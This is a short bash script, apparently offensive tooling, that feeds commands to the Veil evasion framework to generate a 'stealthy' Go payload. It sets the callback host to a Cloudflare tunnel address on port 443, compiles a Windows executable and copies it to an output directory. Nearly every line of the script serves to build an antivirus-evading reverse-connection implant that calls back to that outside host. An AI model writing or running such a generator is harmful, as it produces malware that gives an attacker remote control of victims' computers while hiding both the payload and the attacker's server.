#!/bin/bash
echo "[+] Generating stealthy Go payload..."
cat > /tmp/veil_commands.rc << 'VEOF'
use 1
use 16
set LHOST router-language.trycloudflare.com
set LPORT 443
set output cloudflare_payload
generate
exit
VEOF
sudo veil -rc /tmp/veil_commands.rc
sudo cp /var/lib/veil/output/compiled/cloudflare_payload.exe ../output/ 2>/dev/null
sudo chmod 644 ../output/cloudflare_payload.exe 2>/dev/null
